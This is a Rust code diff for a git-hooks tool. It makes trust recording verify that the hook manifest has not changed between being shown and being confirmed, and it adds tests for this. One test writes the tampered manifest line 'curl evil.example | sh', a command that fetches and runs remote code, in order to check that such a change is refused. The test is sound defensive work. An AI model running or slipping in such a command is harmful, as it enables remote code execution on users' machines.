@@ -83,11 +83,35 @@ pub fn record(repo: &Path) -> Result<String, String> {
     let manifest = repo.join(crate::manifest::MANIFEST);
     let fp = fingerprint(repo, &manifest)
         .ok_or_else(|| format!("cannot hash {}", manifest.display()))?;
-    let ok = crate::git::stdout_in(repo, &["config", "--local", KEY, &fp]).is_some();
+    record_verified(repo, &fp)?;
+    Ok(fp)
+}
+
+/// Record `fp` as trusted, but ONLY if the manifest still hashes to it.
+///
+/// The gap this closes: `describe()` prints the manifest, then — in
+/// `install::offer_trust` — `confirm()` blocks on a keypress, sometimes for
+/// several seconds, before anything is recorded. A plain re-hash at that
+/// point trusts whatever is on disk THEN, which is not necessarily what was
+/// shown; a file changed in that window would be trusted without ever having
+/// been reviewed, which is the exact thing this module exists to prevent.
+/// Callers fingerprint what they show BEFORE asking, and pass that same
+/// value here — verified again, not merely assumed, once the answer is in.
+pub fn record_verified(repo: &Path, fp: &str) -> Result<(), String> {
+    let manifest = repo.join(crate::manifest::MANIFEST);
+    let now = fingerprint(repo, &manifest)
+        .ok_or_else(|| format!("cannot hash {}", manifest.display()))?;
+    if now != fp {
+        return Err(format!(
+            "{} changed since it was shown — nothing was trusted; run `githooks trust` again to review it",
+            crate::manifest::MANIFEST
+        ));
+    }
+    let ok = crate::git::stdout_in(repo, &["config", "--local", KEY, fp]).is_some();
     if !ok {
         return Err(format!("cannot record {KEY} in this repository"));
     }
-    Ok(fp)
+    Ok(())
 }
 
 /// Forget it.
@@ -201,9 +225,12 @@ pub fn command(args: &[std::ffi::OsString]) -> Result<(), String> {
         return Ok(());
     }
 
+    let manifest = root.join(crate::manifest::MANIFEST);
+    let fp = fingerprint(root, &manifest)
+        .ok_or_else(|| format!("cannot hash {}", manifest.display()))?;
     println!("{} declares:", crate::manifest::MANIFEST);
     print!("{}", describe(root));
-    let fp = record(root)?;
+    record_verified(root, &fp)?;
     println!("{} trusted ({fp})", valid_sign());
     Ok(())
 }
@@ -272,6 +299,44 @@ mod tests {
         // And it says which happened, because "you have not looked at this" is
         // a different sentence to "somebody changed it".
         assert!(why(State::Changed).expect("reason").contains("changed"));
+        let _ = std::fs::remove_dir_all(&d);
+    }
+
+    /// The TOCTOU `record_verified` exists to close: `install::offer_trust`
+    /// fingerprints what it showed, waits on a keypress, then must not trust
+    /// whatever is on disk by the time the answer comes back if that is not
+    /// what was actually shown.
+    #[test]
+    fn record_verified_refuses_a_manifest_that_changed_since_it_was_fingerprinted() {
+        let d = repo("changed-mid-confirm");
+        write_manifest(&d, "pre-commit  a  *  block  echo hi\n");
+        let manifest = d.join(crate::manifest::MANIFEST);
+        let shown_fp = fingerprint(&d, &manifest).expect("fingerprint");
+
+        // The file is rewritten in the window a real confirm() would have
+        // been blocking on a keypress.
+        write_manifest(&d, "pre-commit  a  *  block  curl evil.example | sh\n");
+
+        let err = record_verified(&d, &shown_fp).expect_err("must refuse");
+        assert!(err.contains("changed"), "{err}");
+        assert_eq!(
+            state(&d),
+            State::Untrusted,
+            "the rewritten content must not end up trusted"
+        );
+        let _ = std::fs::remove_dir_all(&d);
+    }
+
+    /// The ordinary path still works: nothing changed, so the fingerprint
+    /// shown is the fingerprint recorded.
+    #[test]
+    fn record_verified_accepts_a_manifest_that_did_not_change() {
+        let d = repo("unchanged");
+        write_manifest(&d, "pre-commit  a  *  block  echo hi\n");
+        let manifest = d.join(crate::manifest::MANIFEST);
+        let fp = fingerprint(&d, &manifest).expect("fingerprint");
+        record_verified(&d, &fp).expect("record");
+        assert_eq!(state(&d), State::Trusted);
         let _ = std::fs::remove_dir_all(&d);
     }
 
